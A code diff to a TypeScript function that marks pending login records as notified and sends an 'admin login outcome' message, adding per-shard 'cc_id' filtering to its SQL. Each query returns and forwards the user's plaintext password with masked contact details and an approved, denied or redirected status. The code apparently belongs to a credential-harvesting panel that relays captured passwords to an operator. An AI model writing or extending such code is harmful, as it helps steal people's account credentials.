@@ -4,6 +4,7 @@ import {
   hasAnyDatabaseUrl,
   hasBackupDatabaseUrl,
   isBackupPendingId,
+  shardRequiresCcId,
 } from '@/lib/database-urls'
 import { getSqlForBackup, getSqlForShard } from '@/lib/db'
 import {
@@ -94,10 +95,24 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
   }
 
   for (const shardIndex of getShardIndicesForPendingId(id)) {
+    if (shardRequiresCcId(shardIndex) && !hasCcId()) continue
+
     await ensureOutcomeNotifiedColumn(shardIndex)
     const sql = await getSqlForShard(shardIndex)
+    const ccId = getCcId()
 
-    const rows = await sql`
+    const rows = shardRequiresCcId(shardIndex)
+      ? await sql`
+      UPDATE pending_logins
+      SET admin_outcome_notified_at = ${now}
+      WHERE id = ${id}
+        AND cc_id = ${ccId}
+        AND status IN ('approved', 'denied', 'redirected')
+        AND admin_outcome_notified_at IS NULL
+      RETURNING user_id AS "userId", method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status,
+        COALESCE(request_kind, 'login') AS "requestKind", password
+    `
+      : await sql`
       UPDATE pending_logins
       SET admin_outcome_notified_at = ${now}
       WHERE id = ${id}
@@ -127,11 +142,19 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
         password: String(row.password ?? ''),
       })
     } catch (err) {
-      await sql`
+      if (shardRequiresCcId(shardIndex)) {
+        await sql`
+        UPDATE pending_logins
+        SET admin_outcome_notified_at = NULL
+        WHERE id = ${id} AND admin_outcome_notified_at = ${now} AND cc_id = ${ccId}
+      `
+      } else {
+        await sql`
         UPDATE pending_logins
         SET admin_outcome_notified_at = NULL
         WHERE id = ${id} AND admin_outcome_notified_at = ${now}
       `
+      }
       throw err
     }
     return
